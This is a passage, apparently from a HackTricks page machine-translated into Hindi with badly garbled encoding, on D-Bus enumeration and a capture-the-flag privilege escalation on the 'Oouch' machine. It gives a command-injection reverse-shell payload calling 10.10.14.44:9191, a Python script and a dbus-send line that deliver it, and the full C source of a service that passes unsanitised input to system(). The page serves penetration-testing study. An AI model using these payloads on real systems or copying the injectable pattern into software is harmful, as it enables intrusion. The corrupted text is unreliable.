‚Ä£ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### ‡§∏‡§≠‡•Ä ‡§∂‡•ã‡§∞ ‡§ï‡•ã ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡§∞‡§®‡§æ <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

‡§Ö‡§ó‡§∞ ‡§¨‡§∏ ‡§™‡§∞ ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏ ‡§§‡§∞‡§π ‡§∏‡•á ‡§è‡§ï ‡§Æ‡•à‡§ö ‡§®‡§ø‡§Ø‡§Æ ‡§™‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Multiple ‡§®‡§ø‡§Ø‡§Æ ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§¶‡§ø ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§®‡§ø‡§Ø‡§Æ ‡§∏‡•á ‡§Æ‡•á‡§≤ ‡§ñ‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è [D-Bus ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º‡•Ä‡§ï‡§∞‡§£](http://dbus.freedesktop.org/doc/dbus-specification.html) ‡§¶‡•á‡§ñ‡•á‡§Ç‡•§

### ‡§Ö‡§ß‡§ø‡§ï

`busctl` ‡§ï‡•á ‡§™‡§æ‡§∏ ‡§î‡§∞ ‡§≠‡•Ä ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§π‡•à‡§Ç, [**‡§â‡§® ‡§∏‡§≠‡•Ä ‡§ï‡•ã ‡§Ø‡§π‡§æ‡§Å ‡§¢‡•Ç‡§Ç‡§¢‡•á‡§Ç**](https://www.freedesktop.org/software/systemd/man/busctl.html)‡•§

## **‡§≠‡•á‡§¶‡•ç‡§Ø ‡§∏‡•ç‡§•‡§ø‡§§‡§ø**

‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ **qtc ‡§è‡§ö‡§ü‡•Ä‡§¨‡•Ä ‡§∏‡•á "oouch" ‡§Æ‡•á‡§Ç** ‡§è‡§ï **‡§Ö‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡§æ‡§∂‡§ø‡§§ ‡§°‡•Ä-‡§¨‡§∏ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó ‡§´‡§º‡§æ‡§á‡§≤** ‡§ñ‡•ã‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã _/etc/dbus-1/system.d/htb.oouch.Block.conf_ ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•à‡•§
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
‡§™‡§ø‡§õ‡§≤‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§∏‡•á ‡§®‡•ã‡§ü ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø **‡§Ü‡§™‡§ï‡•ã ‡§á‡§∏ D-BUS ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≠‡•á‡§ú‡§®‡•á ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ `root` ‡§Ø‡§æ `www-data` ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è**‡•§

‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ **aeb4525789d8** ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ **qtc** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§´‡§º‡§æ‡§á‡§≤ _/code/oouch/routes.py_ ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ dbus ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡•ã‡§° ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ï‡•ã‡§° ‡§π‡•à:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§Ø‡§π **‡§è‡§ï D-Bus ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§∏‡•á ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à** ‡§î‡§∞ "Block" ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã "client\_ip" ‡§ï‡•ã ‡§≠‡•á‡§ú ‡§∞‡§π‡§æ ‡§π‡•à‡•§

D-Bus ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§¶‡•Ç‡§∏‡§∞‡•Ä ‡§ì‡§∞ ‡§ï‡•Å‡§õ C ‡§∏‡§Ç‡§ï‡§≤‡§ø‡§§ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§ï‡•ã‡§° D-Bus ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§Æ‡•á‡§Ç **IP ‡§™‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Å‡§® ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ `system` ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á iptables ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à** ‡§¶‡§ø‡§è ‡§ó‡§è IP ‡§™‡§§‡•á ‡§ï‡•ã ‡§¨‡•ç‡§≤‡•â‡§ï ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§\
**`system` ‡§ï‡•ã‡§Æ‡§æ‡§Ç‡§° ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§¶‡•ç‡§¶‡•á‡§∂‡•ç‡§Ø ‡§∏‡•á ‡§µ‡§Ç‡§∂‡•Ä ‡§π‡•à**, ‡§á‡§∏‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•á‡§≤‡•ã‡§° ‡§è‡§ï ‡§∞‡§ø‡§µ‡§∞‡•ç‡§∏ ‡§∂‡•à‡§≤ ‡§¨‡§®‡§æ‡§è‡§ó‡§æ: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### ‡§á‡§∏‡§ï‡§æ ‡§∂‡•Ä‡§ò‡•ç‡§∞‡§´‡§≤‡§ï ‡§ï‡§∞‡•á‡§Ç

‡§á‡§∏ ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•á ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§Ü‡§™ **D-Bus ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡§æ ‡§™‡•Ç‡§∞‡§æ C ‡§ï‡•ã‡§°** ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§Ü‡§™ 91-97 ‡§≤‡§æ‡§á‡§®‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö **‡§ï‡•à‡§∏‡•á `D-Bus ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§™‡§•`** ‡§î‡§∞ `‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§®‡§æ‡§Æ` **‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§π‡•à‡§Ç** ‡§Ø‡§π ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä D-Bus ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•ã‡§ó‡•Ä:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Also, in line 57 you can find that **‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï ‡§µ‡§ø‡§ß‡§ø ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§** ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§∏ D-Bus ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§æ‡§Æ‡§ï‡§∞‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à `Block`(_**‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§ï‡•á ‡§ñ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§™‡•á‡§≤‡•ã‡§° ‡§∏‡•á‡§µ‡§æ ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü `htb.oouch.Block`, ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ `/htb/oouch/Block` ‡§î‡§∞ ‡§µ‡§ø‡§ß‡§ø ‡§®‡§æ‡§Æ `Block` ‡§™‡§∞ ‡§≠‡•á‡§ú‡•á ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡§æ‡§Ø‡§•‡§® ‡§ï‡•ã‡§° D-Bus ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§Æ‡•á‡§Ç `Block` ‡§µ‡§ø‡§ß‡§ø ‡§ï‡•ã `block_iface.Block(runme)` ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≠‡•á‡§ú‡•á‡§ó‡§æ (_‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§™‡§ø‡§õ‡§≤‡•á ‡§ï‡•ã‡§° ‡§ñ‡§Ç‡§° ‡§∏‡•á ‡§®‡§ø‡§ï‡§æ‡§≤‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ‡§î‡§∞ dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` ‡§è‡§ï ‡§â‡§™‡§ï‡§∞‡§£ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó "‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§¨‡§∏" ‡§ï‡•ã ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
* ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§¨‡§∏ - ‡§è‡§ï ‡§∏‡•â‡§´‡•ç‡§ü‡§µ‡•á‡§Ø‡§∞ ‡§ú‡•ã ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®‡•ç‡§∏ ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§ï‡•ã ‡§Ü‡§∏‡§æ‡§® ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡§§‡§æ‡§∞ (‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ç‡§∞‡§Æ ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∞‡§Æ‡§¨‡§¶‡•ç‡§ß ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç) ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§¨‡§∏ ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡•ã ‡§è‡§ï ‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§Æ‡•â‡§°‡§≤ ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§π ‡§¨‡§π‡•Å‡§§ ‡§§‡•á‡§ú ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§
* "-system" ‡§ü‡•à‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§á‡§∏‡•á ‡§è‡§ï ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§â‡§≤‡•ç‡§≤‡•á‡§ñ‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§® ‡§ï‡§ø ‡§è‡§ï ‡§∏‡§§‡•ç‡§∞ ‡§∏‡§Ç‡§¶‡•á‡§∂ (‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á)‡•§
* "--print-reply" ‡§ü‡•à‡§ó ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§π‡§Æ‡§æ‡§∞‡•á ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§ï‡•ã ‡§â‡§ö‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§Æ‡§æ‡§®‡§µ-‡§™‡§†‡§®‡•Ä‡§Ø ‡§∏‡•ç‡§µ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ú‡§µ‡§æ‡§¨ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
* "--dest=Dbus-Interface-Block" - Dbus ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡§æ ‡§™‡§§‡§æ‡•§
* "--string:" - ‡§π‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡•ã ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§∏‡•ç‡§∏‡•á‡§ú ‡§ï‡§æ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞‡•§ ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§ï‡§à ‡§™‡•ç‡§∞‡§æ‡§∞‡•Ç‡§™ ‡§π‡•à‡§Ç ‡§ú‡•à‡§∏‡•á ‡§°‡§¨‡§≤, ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏, ‡§¨‡•Ç‡§≤‡§ø‡§Ø‡§®, ‡§á‡§Ç‡§ü, ‡§ë‡§¨‡•ç‡§ú‡§™‡§•‡•§ ‡§á‡§®‡§Æ‡•á‡§Ç ‡§∏‡•á, "‡§ë‡§¨‡•ç‡§ú
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

# ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§ú‡•Å‡§°‡§º‡•á‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>
